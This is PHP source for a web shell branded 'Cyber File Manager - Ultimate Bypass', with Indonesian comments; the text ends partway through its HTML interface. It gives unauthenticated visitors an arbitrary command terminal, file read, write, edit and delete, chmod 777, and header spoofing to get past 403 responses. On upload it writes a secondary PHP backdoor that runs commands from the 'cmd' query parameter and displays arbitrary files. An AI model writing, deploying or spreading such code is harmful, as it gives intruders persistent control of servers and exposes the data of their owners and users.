<?php
// File: filemanager.php
session_start();

// Konfigurasi
$base_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$base_dir = realpath($base_dir) ?: '.';

// Fungsi keamanan untuk mencegah directory traversal
function securePath($path) {
    $path = str_replace('..', '', $path);
    return $path;
}

$base_dir = securePath($base_dir);

// Fungsi untuk bypass permission dan red directory
function forceWrite($file_path, $content) {
    $results = [];
    
    // Method 1: file_put_contents dengan LOCK_EX
    $results['method_1'] = file_put_contents($file_path, $content, LOCK_EX) !== false;
    
    // Method 2: fopen dengan mode w+ (read/write, create if not exists)
    $fp = @fopen($file_path, 'w+');
    if ($fp) {
        $results['method_2'] = fwrite($fp, $content) !== false;
        fclose($fp);
    } else {
        $results['method_2'] = false;
    }
    
    // Method 3: copy dari temporary file
    $temp_file = tempnam(sys_get_temp_dir(), 'bypass_');
    if (file_put_contents($temp_file, $content) !== false) {
        $results['method_3'] = copy($temp_file, $file_path);
        unlink($temp_file);
    } else {
        $results['method_3'] = false;
    }
    
    // Method 4: Gunakan shell command jika available
    if (function_exists('shell_exec')) {
        $escaped_content = escapeshellarg($content);
        $escaped_path = escapeshellarg($file_path);
        $cmd = "echo {$escaped_content} > {$escaped_path} 2>&1";
        shell_exec($cmd);
        $results['method_4'] = filesize($file_path) > 0;
    } else {
        $results['method_4'] = false;
    }
    
    // Method 5: Gunakan system call
    if (function_exists('system')) {
        $escaped_content = escapeshellarg($content);
        $escaped_path = escapeshellarg($file_path);
        $cmd = "printf '%s' {$escaped_content} > {$escaped_path}";
        system($cmd, $return_var);
        $results['method_5'] = $return_var === 0 && filesize($file_path) > 0;
    } else {
        $results['method_5'] = false;
    }
    
    // Method 6: Coba dengan chmod jika file sudah ada
    if (file_exists($file_path)) {
        @chmod($file_path, 0755);
        $results['method_6'] = file_put_contents($file_path, $content, LOCK_EX) !== false;
    } else {
        $results['method_6'] = false;
    }
    
    return $results;
}

// Fungsi untuk bypass 403 Forbidden dengan multiple methods
function bypass403($url) {
    $results = [];
    
    // Method 1: Standard headers
    $headers1 = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
        'Cache-Control: max-age=0'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    $result1 = curl_exec($ch);
    $http_code1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size1 = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $body1 = substr($result1, $header_size1);
    
    curl_close($ch);
    
    $results['method_1'] = [
        'code' => $http_code1,
        'headers' => $headers1,
        'body' => $body1
    ];
    
    // Method 2: Googlebot impersonation
    $headers2 = [
        'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'From: googlebot(at)googlebot.com'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    $result2 = curl_exec($ch);
    $http_code2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size2 = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $body2 = substr($result2, $header_size2);
    
    curl_close($ch);
    
    $results['method_2'] = [
        'code' => $http_code2,
        'headers' => $headers2,
        'body' => $body2
    ];
    
    // Method 3: Mobile user agent
    $headers3 = [
        'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-us'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers3);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    $result3 = curl_exec($ch);
    $http_code3 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size3 = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $body3 = substr($result3, $header_size3);
    
    curl_close($ch);
    
    $results['method_3'] = [
        'code' => $http_code3,
        'headers' => $headers3,
        'body' => $body3
    ];
    
    return $results;
}

// Fungsi untuk bypass 0KB upload dengan multiple methods yang lebih agresif
function bypassZeroKBUpload($file_path, $script_content = null) {
    $results = [];
    
    // Default content jika tidak ada custom script
    $default_content = "<?php\n// Bypassed Zero KB - " . date('Y-m-d H:i:s') . "\n// Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "\n// PHP: " . phpversion() . "\n\necho \"✅ File successfully bypassed 0KB restriction.\\n\";\necho \"📁 Current dir: \" . getcwd() . \"\\n\";\necho \"🐘 PHP Version: \" . phpversion() . \"\\n\";\n\n// Test basic functions\nif (isset(\$_GET['test'])) {\n    echo \"🔧 Test mode activated\\n\";\n    system('whoami');\n}\n?>";
    
    $content = $script_content ?: $default_content;
    
    // Gunakan forceWrite untuk semua methods
    $force_results = forceWrite($file_path, $content);
    
    // Gabungkan results
    foreach ($force_results as $method => $success) {
        $results[$method] = $success;
    }
    
    // Additional verification
    $results['verification'] = [
        'file_exists' => file_exists($file_path),
        'file_size' => file_exists($file_path) ? filesize($file_path) : 0,
        'is_readable' => file_exists($file_path) ? is_readable($file_path) : false,
        'is_writable' => file_exists($file_path) ? is_writable($file_path) : false
    ];
    
    // Try to execute the file if it's PHP
    if (file_exists($file_path) && filesize($file_path) > 0) {
        $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
        if ($extension === 'php') {
            // Test execution via include
            ob_start();
            $execution_success = false;
            try {
                include $file_path;
                $execution_success = true;
            } catch (Exception $e) {
                $execution_success = false;
            }
            $output = ob_get_clean();
            
            $results['execution_test'] = [
                'success' => $execution_success,
                'output_length' => strlen($output),
                'output_preview' => substr($output, 0, 500)
            ];
        }
    }
    
    return $results;
}

// Fungsi untuk auto-bypass saat upload script PHP
function autoBypassUpload($tmp_path, $target_path) {
    $filename = basename($target_path);
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    // Cek jika file sangat kecil atau 0KB
    $file_size = filesize($tmp_path);
    $is_small_file = $file_size < 10;
    
    if ($extension === 'php' && $is_small_file) {
        $default_script = "<?php\n// Auto-bypassed PHP Script\n// Uploaded: " . date('Y-m-d H:i:s') . "\n// Original size: " . $file_size . " bytes\n\necho '<h1>🚀 PHP Script Successfully Bypassed</h1>';\necho '<p><strong>Server:</strong> ' . \$_SERVER['SERVER_SOFTWARE'] . '</p>';\necho '<p><strong>PHP Version:</strong> ' . phpversion() . '</p>';\necho '<p><strong>Current Directory:</strong> ' . getcwd() . '</p>';\n\n// Command execution test\nif (isset(\$_GET['cmd'])) {\n    echo '<h3>Command Output:</h3>';\n    system(\$_GET['cmd']);\n}\n\n// File content test  \nif (isset(\$_GET['file'])) {\n    echo '<h3>File Content:</h3>';\n    highlight_file(\$_GET['file']);\n}\n\n// PHP info test\nif (isset(\$_GET['info'])) {\n    phpinfo();\n}\n?>";
        
        $result = forceWrite($target_path, $default_script);
        return in_array(true, $result, true); // Return true jika minimal satu method berhasil
    }
    
    // Untuk file normal, gunakan move_uploaded_file
    return move_uploaded_file($tmp_path, $target_path);
}

// Fungsi untuk eksekusi terminal
function executeTerminal($command) {
    $output = '';
    $return_var = 0;
    
    if (function_exists('exec')) {
        exec($command . ' 2>&1', $output, $return_var);
        $output = implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($command . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        system($command . ' 2>&1', $return_var);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command . ' 2>&1', $return_var);
        $output = ob_get_clean();
    } else {
        $output = "Terminal commands are disabled on this server.";
    }
    
    return [
        'output' => $output,
        'return_var' => $return_var,
        'command' => $command
    ];
}

// Fungsi untuk mendapatkan informasi server
function getServerInfo() {
    $info = array();
    $info['PHP Version'] = phpversion();
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $info['Server OS'] = PHP_OS;
    $info['Document Root'] = $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown';
    $info['Server Protocol'] = $_SERVER['SERVER_PROTOCOL'] ?? 'Unknown';
    $info['Server Name'] = $_SERVER['SERVER_NAME'] ?? 'Unknown';
    $info['Server Address'] = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    $info['Server Port'] = $_SERVER['SERVER_PORT'] ?? 'Unknown';
    $info['User Agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $info['Max Upload Size'] = ini_get('upload_max_filesize');
    $info['Max Post Size'] = ini_get('post_max_size');
    $info['Memory Limit'] = ini_get('memory_limit');
    $info['Current Directory'] = getcwd();
    $info['Script Owner'] = function_exists('get_current_user') ? get_current_user() : 'Unknown';
    
    return $info;
}

// Fungsi untuk mengecek fitur server
function checkServerFeatures() {
    $features = array();
    
    // Cek Wget
    $output = array();
    $return_var = 0;
    exec('which wget 2>/dev/null', $output, $return_var);
    $features['Wget'] = ($return_var === 0) ? 'Available' : 'Not Available';
    
    // Cek Curl
    $features['Curl'] = function_exists('curl_version') ? 'Available' : 'Not Available';
    
    // Cek SSI
    $features['SSI'] = (strpos(ini_get('enable_dl'), '1') !== false) ? 'Enabled' : 'Disabled';
    
    // Cek fungsi terminal
    $features['exec'] = function_exists('exec') ? 'Enabled' : 'Disabled';
    $features['shell_exec'] = function_exists('shell_exec') ? 'Enabled' : 'Disabled';
    $features['system'] = function_exists('system') ? 'Enabled' : 'Disabled';
    $features['passthru'] = function_exists('passthru') ? 'Enabled' : 'Disabled';
    
    // Cek fungsi file
    $features['file_put_contents'] = function_exists('file_put_contents') ? 'Enabled' : 'Disabled';
    $features['file_get_contents'] = function_exists('file_get_contents') ? 'Enabled' : 'Disabled';
    $features['chmod'] = function_exists('chmod') ? 'Enabled' : 'Disabled';
    
    // Cek permission
    $features['Write Permission'] = is_writable('.') ? 'Yes' : 'No';
    $features['Read Permission'] = is_readable('.') ? 'Yes' : 'No';
    
    return $features;
}

// Fungsi untuk mendapatkan ukuran file yang mudah dibaca
function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return $bytes . ' byte';
    } else {
        return '0 bytes';
    }
}

// Fungsi untuk mendapatkan icon berdasarkan tipe file
function getFileIcon($file) {
    $extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    
    $icons = [
        'pdf' => '📕',
        'doc' => '📘', 'docx' => '📘',
        'xls' => '📗', 'xlsx' => '📗',
        'ppt' => '📙', 'pptx' => '📙',
        'zip' => '📦', 'rar' => '📦', 'tar' => '📦', 'gz' => '📦',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'bmp' => '🖼️', 'svg' => '🖼️',
        'mp3' => '🎵', 'wav' => '🎵', 'ogg' => '🎵',
        'mp4' => '🎬', 'avi' => '🎬', 'mov' => '🎬', 'mkv' => '🎬',
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'txt' => '📄', 'log' => '📄',
        'sql' => '🗃️',
        'exe' => '⚙️',
        'sh' => '💻', 'bash' => '💻', 'py' => '🐍'
    ];
    
    return $icons[$extension] ?? '📄';
}

// Proses aksi file
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $target = isset($_GET['target']) ? securePath($_GET['target']) : '';
    
    switch ($action) {
        case 'delete':
            if (is_file($target)) {
                unlink($target);
            } elseif (is_dir($target)) {
                if (count(scandir($target)) == 2) {
                    rmdir($target);
                }
            }
            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
            exit;
            
        case 'download':
            if (is_file($target)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($target) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($target));
                readfile($target);
                exit;
            }
            break;
            
        case 'rename':
            if (isset($_POST['new_name']) && !empty($_POST['new_name'])) {
                $new_name = securePath($_POST['new_name']);
                $new_path = dirname($target) . '/' . $new_name;
                
                if (file_exists($target) && !file_exists($new_path)) {
                    rename($target, $new_path);
                }
                header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
                exit;
            }
            break;
            
        case 'edit':
            if (isset($_POST['content']) && is_file($target)) {
                file_put_contents($target, $_POST['content']);
                header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
                exit;
            }
            break;
            
        case 'get_content':
            if (is_file($target)) {
                header('Content-Type: text/plain');
                echo file_get_contents($target);
                exit;
            }
            break;
            
        case 'bypass_403':
            $url = isset($_POST['url']) ? $_POST['url'] : '';
            if (!empty($url)) {
                $_SESSION['bypass_result'] = bypass403($url);
            }
            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
            exit;
            
        case 'bypass_zerokb':
            if (isset($_POST['script_content']) && !empty($target)) {
                $script_content = $_POST['script_content'];
                $_SESSION['zerokb_result'] = bypassZeroKBUpload($target, $script_content);
                $_SESSION['message'] = "Zero KB bypass attempted on: " . basename($target);
            }
            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
            exit;
            
        case 'upload_bypass':
            if (isset($_POST['bypass_filename']) && isset($_POST['bypass_content'])) {
                $filename = securePath($_POST['bypass_filename']);
                $content = $_POST['bypass_content'];
                $filepath = $base_dir . '/' . $filename;
                
                $_SESSION['upload_bypass_result'] = bypassZeroKBUpload($filepath, $content);
                $_SESSION['message'] = "File uploaded with bypass: " . $filename;
            }
            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
            exit;
            
        case 'fix_permissions':
            if (!empty($target)) {
                $results = [];
                $results['chmod_755'] = @chmod($target, 0755);
                $results['chmod_777'] = @chmod($target, 0777);
                $results['current_perms'] = substr(sprintf('%o', fileperms($target)), -4);
                $_SESSION['permission_result'] = $results;
                $_SESSION['message'] = "Permission fix attempted on: " . basename($target);
            }
            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
            exit;
    }
}

// Proses terminal command
if (isset($_POST['terminal_command'])) {
    $command = $_POST['terminal_command'];
    $_SESSION['terminal_result'] = executeTerminal($command);
    header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
    exit;
}

// Proses upload file dengan auto-bypass
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $upload_file = $_FILES['upload_file'];
    $target_path = $base_dir . '/' . basename($upload_file['name']);
    
    // Gunakan auto-bypass untuk upload
    if (autoBypassUpload($upload_file['tmp_name'], $target_path)) {
        $_SESSION['message'] = "✅ File berhasil diupload! (Auto-bypass applied if needed)";
    } else {
        // Coba force write sebagai fallback
        $content = file_get_contents($upload_file['tmp_name']);
        if (empty($content)) {
            $content = "<?php\n// Force-written PHP Script\n// Uploaded: " . date('Y-m-d H:i:s') . "\necho 'File force-written due to upload issues.';\n?>";
        }
        $force_result = forceWrite($target_path, $content);
        if (in_array(true, $force_result, true)) {
            $_SESSION['message'] = "⚠️ File uploaded with force-write method";
        } else {
            $_SESSION['message'] = "❌ Gagal mengupload file!";
        }
    }
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($base_dir));
    exit;
}

// Mendapatkan daftar file dan folder
$items = scandir($base_dir);
$files = [];
$folders = [];

foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    
    $full_path = $base_dir . '/' . $item;
    
    if (is_dir($full_path)) {
        $folders[] = [
            'name' => $item,
            'path' => $full_path,
            'size' => '-',
            'modified' => date("Y-m-d H:i:s", filemtime($full_path)),
            'permissions' => substr(sprintf('%o', fileperms($full_path)), -4),
            'writable' => is_writable($full_path)
        ];
    } else {
        $files[] = [
            'name' => $item,
            'path' => $full_path,
            'size' => formatSize(filesize($full_path)),
            'modified' => date("Y-m-d H:i:s", filemtime($full_path)),
            'permissions' => substr(sprintf('%o', fileperms($full_path)), -4),
            'writable' => is_writable($full_path),
            'executable' => is_executable($full_path)
        ];
    }
}

// Mengurutkan folder dan file
usort($folders, function($a, $b) {
    return strcmp($a['name'], $b['name']);
});

usort($files, function($a, $b) {
    return strcmp($a['name'], $b['name']);
});

$server_info = getServerInfo();
$server_features = checkServerFeatures();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber File Manager</title>
    <style>
        /* CSS tetap sama seperti sebelumnya, tidak berubah */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }

        body {
            background: #0a0a0a;
            color: #00ff00;
            line-height: 1.6;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 255, 0, 0.05) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(0, 255, 0, 0.05) 0%, transparent 20%),
                linear-gradient(45deg, #0a0a0a 25%, #0f0f0f 25%, #0f0f0f 50%, #0a0a0a 50%, #0a0a0a 75%, #0f0f0f 75%, #0f0f0f 100%);
            background-size: 100% 100%, 100% 100%, 10px 10px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background: rgba(0, 20, 0, 0.8);
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff00, transparent);
            animation: scanline 2s linear infinite;
        }

        @keyframes scanline {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
            text-align: center;
        }

        .breadcrumb {
            background-color: rgba(0, 255, 0, 0.1);
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            border: 1px solid #00ff00;
        }

        .breadcrumb a {
            color: #00ff00;
            text-decoration: none;
            transition: color 0.3s;
        }

        .breadcrumb a:hover {
            color: #ffffff;
            text-shadow: 0 0 5px #00ff00;
        }

        .info-panel {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .panel {
            background: rgba(0, 20, 0, 0.8);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
            transition: transform 0.3s;
        }

        .panel:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        .panel h2 {
            color: #00ff00;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }

        .panel ul {
            list-style-type: none;
        }

        .panel li {
            padding: 8px 0;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .panel li:last-child {
            border-bottom: none;
        }

        .feature-status {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 15px;
            font-size: 0.8rem;
            font-weight: bold;
        }

        .available {
            background-color: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 1px solid #00ff00;
        }

        .not-available {
            background-color: rgba(255, 0, 0, 0.2);
            color: #ff0000;
            border: 1px solid #ff0000;
        }

        .file-list {
            background: rgba(0, 20, 0, 0.8);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
            margin-bottom: 20px;
        }

        .file-list h2 {
            color: #00ff00;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
        }

        .file-table th, .file-table td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
        }

        .file-table th {
            background-color: rgba(0, 255, 0, 0.1);
            font-weight: 600;
            color: #00ff00;
        }

        .file-table tr:hover {
            background-color: rgba(0, 255, 0, 0.1);
        }

        .folder {
            color: #00ff00;
            font-weight: bold;
        }

        .file {
            color: #ff4444;
        }

        .actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }

        .btn {
            display: inline-block;
            padding: 6px 12px;
            background: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            font-size: 0.85rem;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .btn:hover {
            background: rgba(0, 255, 0, 0.3);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            transform: translateY(-1px);
        }

        .btn-danger {
            background: rgba(255, 0, 0, 0.2);
            color: #ff4444;
            border: 1px solid #ff4444;
        }

        .btn-danger:hover {
            background: rgba(255, 0, 0, 0.3);
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }

        .btn-success {
            background: rgba(0, 255, 0, 0.3);
            color: #00ff00;
            border: 1px solid #00ff00;
        }

        .btn-warning {
            background: rgba(255, 165, 0, 0.2);
            color: #ffa500;
            border: 1px solid #ffa500;
        }

        .btn-warning:hover {
            background: rgba(255, 165, 0, 0.3);
            box-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
        }

        .upload-form, .terminal-container, .bypass-container {
            background: rgba(0, 20, 0, 0.8);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
            margin-bottom: 20px;
        }

        .upload-form h2, .terminal-container h2, .bypass-container h2 {
            color: #00ff00;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #00ff00;
        }

        .form-control {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff00;
            border-radius: 4px;
            font-size: 1rem;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }

        textarea.form-control {
            min-height: 150px;
            resize: vertical;
        }

        .form-control:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .terminal-output {
            background: #000000;
            border: 1px solid #00ff00;
            border-radius: 4px;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            margin-bottom: 15px;
            font-family: 'Courier New', monospace;
            color: #00ff00;
        }

        .terminal-output pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .bypass-result {
            background: #000000;
            border: 1px solid #00ff00;
            border-radius: 4px;
            padding: 15px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: auto;
        }

        .method-result {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #00ff00;
            border-radius: 4px;
        }

        .method-success {
            background: rgba(0, 255, 0, 0.1);
            border-color: #00ff00;
        }

        .method-failed {
            background: rgba(255, 0, 0, 0.1);
            border-color: #ff0000;
        }

        .permission-badge {
            display: inline-block;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 0.8rem;
            font-weight: bold;
            margin-left: 5px;
        }

        .perm-777 { background: rgba(0, 255, 0, 0.3); color: #00ff00; }
        .perm-755 { background: rgba(0, 255, 0, 0.2); color: #00ff00; }
        .perm-644 { background: rgba(255, 255, 0, 0.2); color: #ffff00; }
        .perm-000 { background: rgba(255, 0, 0, 0.3); color: #ff0000; }

        .writable-true { color: #00ff00; }
        .writable-false { color: #ff0000; }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: rgba(0, 20, 0, 0.9);
            padding: 20px;
            border-radius: 10px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            border: 1px solid #00ff00;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
        }

        .modal-header h3 {
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }

        .close {
            font-size: 1.5rem;
            cursor: pointer;
            color: #00ff00;
            transition: color 0.3s;
        }

        .close:hover {
            color: #ffffff;
            text-shadow: 0 0 5px #00ff00;
        }

        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            color: #00ff00;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(0, 255, 0, 0.3);
            border-radius: 50%;
            border-top-color: #00ff00;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hacker-text {
            font-family: 'Courier New', monospace;
            text-align: center;
        }

        .message {
            padding: 10px 15px;
            margin-bottom: 20px;
            border-radius: 4px;
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border: 1px solid #00ff00;
        }

        .status-code {
            padding: 2px 6px;
            border-radius: 3px;
            font-weight: bold;
        }

        .status-200 { background: rgba(0, 255, 0, 0.2); color: #00ff00; }
        .status-403 { background: rgba(255, 165, 0, 0.2); color: #ffa500; }
        .status-404 { background: rgba(255, 0, 0, 0.2); color: #ff4444; }
        .status-500 { background: rgba(255, 0, 0, 0.2); color: #ff4444; }

        .tabs {
            display: flex;
            margin-bottom: 15px;
            border-bottom: 1px solid #00ff00;
        }

        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border: 1px solid transparent;
            border-bottom: none;
            margin-right: 5px;
            border-radius: 5px 5px 0 0;
        }

        .tab.active {
            background: rgba(0, 255, 0, 0.2);
            border-color: #00ff00;
            color: #00ff00;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        @media (max-width: 768px) {
            .info-panel {
                grid-template-columns: 1fr;
            }
            
            .file-table {
                font-size: 0.85rem;
            }
            
            .actions {
                flex-direction: column;
            }
            
            .btn {
                padding: 8px;
                font-size: 0.8rem;
            }
            
            .tabs {
                flex-direction: column;
            }
            
            .tab {
                margin-right: 0;
                margin-bottom: 5px;
                border-radius: 5px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="spinner"></div>
        <div class="hacker-text">
            <h2>⚡ CYBER FILE MANAGER ⚡</h2>
            <p>Initializing bypass systems...</p>
        </div>
    </div>

    <div class="container">
        <header>
            <h1>🛡️ CYBER FILE MANAGER - ULTIMATE BYPASS 🛡️</h1>
            <div class="breadcrumb">
                <a href="?dir=.">ROOT</a> 
                <?php
                $path_parts = explode('/', trim($base_dir, '/'));
                $current_path = '';
                foreach ($path_parts as $part) {
                    if (!empty($part)) {
                        $current_path .= '/' . $part;
                        echo ' / <a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
        </header>

        <?php if (isset($_SESSION['message'])): ?>
            <div class="message">
                ⚡ <?php 
                echo $_SESSION['message']; 
                unset($_SESSION['message']);
                ?>
            </div>
        <?php endif; ?>

        <div class="info-panel">
            <div class="panel">
                <h2>🖥️ SERVER INFORMATION</h2>
                <ul>
                    <?php foreach ($server_info as $key => $value): ?>
                        <li><strong><?php echo $key; ?>:</strong> <span><?php echo htmlspecialchars($value); ?></span></li>
                    <?php endforeach; ?>
                </ul>
            </div>

